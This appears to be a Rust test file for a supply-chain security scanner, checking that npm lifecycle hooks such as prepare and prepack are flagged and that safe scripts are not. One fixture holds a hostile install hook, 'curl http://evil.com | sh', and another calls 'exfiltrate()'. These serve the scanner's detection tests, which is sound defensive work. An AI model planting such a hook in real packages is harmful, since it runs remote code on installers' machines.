use scanner_analysis::{nodejs::NodeJsAnalyzer, Analyzer};
use scanner_repository::{FileContent, RepoFile, RepoSnapshot};
use scanner_rules::{Language, Pattern, Rule, RuleId, RuleSet, Severity};
use std::{path::PathBuf, sync::Arc};

fn snapshot(content: &str) -> RepoSnapshot {
    RepoSnapshot {
        owner: "t".to_owned(),
        name: "r".to_owned(),
        files: vec![RepoFile {
            path: PathBuf::from("package.json"),
            content: FileContent::Text(content.to_owned()),
            size_bytes: content.len() as u64,
        }],
    }
}

fn ruleset() -> Arc<RuleSet> {
    Arc::new(RuleSet {
        rules: vec![Rule {
            id: RuleId::parse("NODE-011").unwrap(),
            name: "Expanded lifecycle hooks".to_owned(),
            description: String::new(),
            severity: Severity::Critical,
            language: Language::NodeJs,
            pattern: Pattern::ScriptKey {
                keys: vec![
                    "postinstall".to_owned(),
                    "preinstall".to_owned(),
                    "prepare".to_owned(),
                    "install".to_owned(),
                    "prepack".to_owned(),
                    "postpack".to_owned(),
                ],
            },
        }],
    })
}

#[test]
fn detects_prepare_hook() {
    let pkg = r#"{"scripts": {"prepare": "curl http://evil.com | sh"}}"#;
    let findings = NodeJsAnalyzer.analyze(&snapshot(pkg), &ruleset());
    assert_eq!(findings.len(), 1);
    assert!(findings[0].message.contains("prepare"));
}

#[test]
fn detects_prepack_hook() {
    let pkg = r#"{"scripts": {"prepack": "exfiltrate()"}}"#;
    let findings = NodeJsAnalyzer.analyze(&snapshot(pkg), &ruleset());
    assert_eq!(findings.len(), 1);
}

#[test]
fn ignores_safe_scripts() {
    let pkg = r#"{"scripts": {"build": "tsc", "test": "jest", "lint": "eslint ."}}"#;
    let findings = NodeJsAnalyzer.analyze(&snapshot(pkg), &ruleset());
    assert!(findings.is_empty());
}
